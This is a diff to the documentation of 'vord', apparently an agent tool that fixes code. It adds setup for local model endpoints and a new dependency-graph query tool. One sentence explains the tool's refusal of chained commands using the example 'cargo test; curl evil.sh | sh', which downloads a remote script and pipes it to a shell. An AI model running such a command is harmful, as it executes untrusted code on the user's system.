@@ -505,6 +505,22 @@ vord agent run --task "fix it" --rule python:subprocess-shell-true --scope scrip
 vord agent watch-pr --pr 42             # wait out the late review/CI window on a PR
 ```
 
+Runs locally against Qwen, Llama, DeepSeek or anything else an
+OpenAI-compatible `/v1/chat/completions` endpoint fronts — Ollama, vLLM,
+LM Studio, LocalAI — with no cloud API key at all:
+
+```sh
+export VORD_LLM_PROVIDER=openai_compatible   # the default; explicit for clarity
+export VORD_LLM_BASE_URL=http://localhost:11434/v1   # Ollama's default; point at vLLM/LM Studio instead
+export VORD_LLM_MODEL=qwen2.5-coder:32b
+vord agent run --task "remove the shell injection in scripts/deploy.py"
+```
+
+`--model` on the command line overrides `VORD_LLM_MODEL` for one run. The
+policy gate and the analyzer verdict apply identically regardless of which
+model is on the other end of the wire — a local model is judged exactly as
+hard as Claude is.
+
 **1. No edit reaches disk without passing the policy.** Not a second
 implementation of the guardrail — the same `hook::judge` a third-party agent's
 write goes through, on the proposed content, in-process, before the `write`
@@ -519,11 +535,20 @@ baseline taken before the run started. If the target rule still fires, or a
 finding appeared that was not there before, the objection becomes the next
 user turn and the session continues. There is no self-assessment turn.
 
-The tool set is closed — `read`, `write`, `edit`, `search`, `run`, `scan` —
-and there is no shell. `run` executes one allow-listed program: no pipes, no
-chaining, no redirection, so `cargo test; curl evil.sh | sh` is refused rather
-than half-checked. Paths are resolved inside the repository root, and a
-command that outlives its timeout is killed.
+The tool set is closed — `read`, `write`, `edit`, `search`, `run`, `scan`,
+`graph` — and there is no shell. `run` executes one allow-listed program: no
+pipes, no chaining, no redirection, so `cargo test; curl evil.sh | sh` is
+refused rather than half-checked. Paths are resolved inside the repository
+root, and a command that outlives its timeout is killed.
+
+`graph` queries the repository's import/dependency graph without the model
+having to `search` its way to an answer by regex: `dependents` (who breaks if
+I change this file), `dependencies` (what this file pulls in), `cycles`
+(import cycles, whole-repository or narrowed to one file), and `components`
+(component-level coupling — the same view `vord arch` renders). It answers
+from the same `core/import-graph` analysis the architecture rules and
+`vord arch` already ship, rebuilt fresh on every call so a file the agent just
+edited is reflected immediately.
 
 Six terminal states, six exit codes, because a supervisor should never have to
 parse prose and "we could not check" must never read as success:
